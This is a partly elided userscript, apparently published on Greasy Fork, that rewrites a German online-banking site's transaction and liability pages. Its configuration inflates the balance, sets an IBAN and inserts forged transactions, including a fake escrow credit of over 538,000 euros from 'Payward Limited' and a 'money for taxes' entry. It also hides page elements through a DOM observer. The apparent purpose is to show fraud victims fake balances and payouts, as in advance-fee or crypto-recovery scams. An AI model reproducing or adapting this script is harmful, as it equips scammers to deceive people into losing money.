// ==UserScript==
// @name         Vertragssignature Auszahlung Wendel Lübbing 2
...
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/474814/Vertragssignature%20Auszahlung%20Wendel%20L%C3%BCbbing%202.user.js
// @updateURL https://update.greasyfork.org/scripts/474814/Vertragssignature%20Auszahlung%20Wendel%20L%C3%BCbbing%202.meta.js
// ==/UserScript==
...
////CONFIGURE/////////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE/////
    ...
    const topGesamtSaldoAdjustmentAmount = 19800;  // Change this to your desired amount

    // Define an array for account balance adjustments
    const accountBalanceAdjustments = [
        { index: 0, amount: 19800 },  // Example: change the first account's balance by -1000 EUR
      //  { index: 3, amount: 12000 },
        // Add more objects as needed for each account balance adjustment
    ];

    // Specify your IBAN and custom transactions here
    const yourIBAN = 'DE47 5001 0517 5402 2982 40'; // Replace with your IBAN
     // Specify the balance change you want to make (positive for increase, negative for decrease)
    const balanceChange = 19800; // Example: decrease balance by 100.00 EUR
    const customTransactions = [
        {
            recipientName: 'Treuhand: Payward Limited',
            transactionDetails: 'Einreichung einer Treuhand Überweisung. Freigabe nötig durch Payward Limited',
            transactionAmount: '+538.790,74',
            moveDirection: 'down',
            moveSteps: 0,
        ...
        },
        {
            ...
            transactionDetails: 'Geld für Steuern',
            transactionAmount: '+19.800,00',
            moveDirection: 'down',
            moveSteps: 0,
...
////CONFIGURE/////////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE/////
 ...
 // Classes to monitor and remove
    ...
    observer.observe(document.body, observerConfig);
        ...
        if (window.location.href.indexOf("umsatzanzeige") > 0 || window.location.href.indexOf("10471988294") > 0) {
    ...
    function moveTransaction(transactionElement, moveDirection, moveSteps) {
      ...
      if (window.location.href.indexOf("obligo/obligo") > 0 || window.location.href.indexOf("10483496082") > 0) {
